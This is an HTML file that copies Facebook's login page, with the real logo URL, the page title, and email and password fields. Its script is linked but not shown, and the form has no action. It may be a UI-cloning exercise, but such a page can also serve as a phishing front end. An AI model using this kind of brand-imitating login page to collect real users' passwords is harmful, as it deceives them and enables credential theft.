<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="content">
            <div class="left-content">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="right-content">
                <div class="login-form-container">
                    <form class="login-form">
                        <input type="text" id="username" placeholder="Email address or phone number" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit" class="login-button">Log In</button>
                        <a href="#" class="forgot-password">Forgotten password?</a>
                        <div class="divider"></div>
                        <button type="button" class="create-account-button">Create New Account</button>
                    </form>
                </div>
                <p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
